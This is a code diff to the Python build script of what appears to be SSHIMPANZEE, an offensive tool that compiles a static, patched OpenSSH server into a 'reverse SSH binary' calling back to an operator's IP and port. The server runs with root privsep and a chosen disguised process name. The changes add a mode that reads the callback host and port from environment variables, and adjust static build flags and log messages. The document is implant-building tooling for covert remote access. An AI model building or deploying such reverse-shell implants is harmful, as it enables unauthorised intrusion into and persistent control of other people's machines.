@@ -21,7 +21,7 @@ cli_pub = ""
 def build_dep():
     print("[*] First build, Setup dependancies")
     cmd = "cd openssh-portable; git checkout eb88d07c43afe407094e7d609248d85a15e148ef; git apply ../patch_openssh.diff; autoreconf"
-    print("|=> Apply patch and run Autoreconf on openssh-portable")
+    print("\t-> Apply patch and run Autoreconf on openssh-portable")
     
     if (run_cmd(cmd)):
         print("[-] Autoreconf failed...")
@@ -49,8 +49,8 @@ def build_dep():
 def clean():
     cmd = "cd openssh-portable; git reset eb88d07c43afe407094e7d609248d85a15e148ef --hard; rm -f sshd; rm configure"
     run_cmd(cmd)
-    #cmd = "cd musl; make clean;"
-    #run_cmd(cmd)
+    cmd = "cd musl; make clean;"
+    run_cmd(cmd)
     cmd = "git submodule foreach --recursive 'git reset --hard HEAD; git clean -fd'"
     run_cmd(cmd)
     if os.path.exists('build/libtun.a'):
@@ -92,19 +92,22 @@ if __name__ == "__main__":
     CFLAGS_add = ""
     LFLAGS_add = ""
 
-    if args.tun:
-        tld = args.remote
-        print(f"/!\\ Using Experimental Tunneling with options:  {args.tun}")
-        tun = build_tun_dep(args.tun)
-        if (args.remote) :
-            print("[!] Build with support for tunnel, --remote information might be ignored, depending on the tunnel in use...")
+    if args.tun or args.dyn_mode:
+        if args.tun:
+            tun = build_tun_dep(args.tun)
+            if (args.remote) :
+                print("[!] Build with support for tunnel or dynamic mode, --remote information might be ignored, depending on the tunnel in use...")
+            
+            ip = '"0.0.0.0"'
+            port = "1234"
+            path = os.getcwd()
+            CFLAGS_add = "-DTUN"
+            LFLAGS_add = f"-ltun -L{path}/build/"
 
-        ip = "0.0.0.0"
-        port = "1234"
-        path = os.getcwd()
-        CFLAGS_add = "-DTUN"
-        LFLAGS_add = f"-ltun -L{path}/build/"
-
+        
+        if args.dyn_mode and not args.tun:
+            ip  = 'getenv("REMOTE")'
+            port = 'atoi(getenv("PORT"))'
 
     else:
         if not args.remote:
@@ -124,11 +127,11 @@ if __name__ == "__main__":
             print(f"[-] Failed to resolve ip address of domain: {ip}, try to pass directly ip address")
             sys.exit(-1)
         
-            
+        ip = f'"{ip}"'
         print(f"[+] Making a reverse SSH binary toward {ip} {port}")
 
-    
-    configure_command = f'cd openssh-portable; ./configure --without-zlib --disable-lastlog --disable-utmp --disable-utmpx --disable-wtmp --disable-wtmpx --disable-libutil --without-openssl CFLAGS="-D_FORTIFY_SOURCE=0 -static-pie -static -Os -fPIC {CFLAGS_add} {args.extra_cflags}" LDFLAGS="-static-pie -static {LFLAGS_add} {args.extra_ldflags}" CC="<COMPILER>"  --without-sandbox --with-privsep-user=root --with-privsep-path=/tmp/  --with-pie '
+    # configure_command = f'cd openssh-portable; ./configure --without-zlib --disable-lastlog --disable-utmp --disable-utmpx --disable-wtmp --disable-wtmpx --disable-libutil --without-openssl CFLAGS="-D_FORTIFY_SOURCE=0 -static-pie -static -Os -fPIC {CFLAGS_add} {args.extra_cflags}" LDFLAGS="-static-pie -static {LFLAGS_add} {args.extra_ldflags}" CC="<COMPILER>"  --without-sandbox --with-privsep-user=root --with-privsep-path=/tmp/  --with-pie '
+    configure_command = f'cd openssh-portable; ./configure --without-zlib --disable-lastlog --disable-utmp --disable-utmpx --disable-wtmp --disable-wtmpx --disable-libutil --without-openssl CFLAGS="-D_FORTIFY_SOURCE=0 -static -Os -fPIC {CFLAGS_add} {args.extra_cflags}" LDFLAGS=" -static {LFLAGS_add} {args.extra_ldflags}" CC="<COMPILER>"  --without-sandbox --with-privsep-user=root --with-privsep-path=/tmp/  --with-pie '
 
     
     if(args.cross_comp):
@@ -151,12 +154,12 @@ if __name__ == "__main__":
             print("\n\n[-] Reconfigure FAILED. You might need some static libraries. Build have been tested succesfully on Centos")
             sys.exit(-1)
     else:
-        print("\t|=> Skipping Reconf")
+        print("\t-> Skipping Reconf")
 
     if args.keygen:              
         gen_keys()
     else:
-        print("\t|=> Skipping Key regen")
+        print("\t-> Skipping Key regen")
     
     print("[*] Load keys")
     host_priv, host_pub, cli_pub = load_keys()
@@ -164,7 +167,7 @@ if __name__ == "__main__":
     print("[*] Generate uniq Keyfile variable")
     keyfile = str(uuid.uuid1())
 
-    print("\t => "+keyfile)
+    print("\t-> "+keyfile)
     sshd_header = sshd_header.replace("<KEYFILE>", keyfile)
     sshd_header = sshd_header.replace("<REMOTE>", ip)
     sshd_header = sshd_header.replace("<PORT>", port)
@@ -178,6 +181,11 @@ if __name__ == "__main__":
         sshd_header = sshd_header.replace("<BANNER>", "")
     sshd_header = sshd_header.replace("<TIMER>", args.timer)
     sshd_header = sshd_header.replace("<SSHIMPANZEE_PROC_NAME>", args.process_name)
+    if args.dyn_mode:
+        sshd_header = sshd_header.replace("<DYN_MODE>", "1")
+    else:
+        sshd_header = sshd_header.replace("<DYN_MODE>", "0")
+
 
 
     
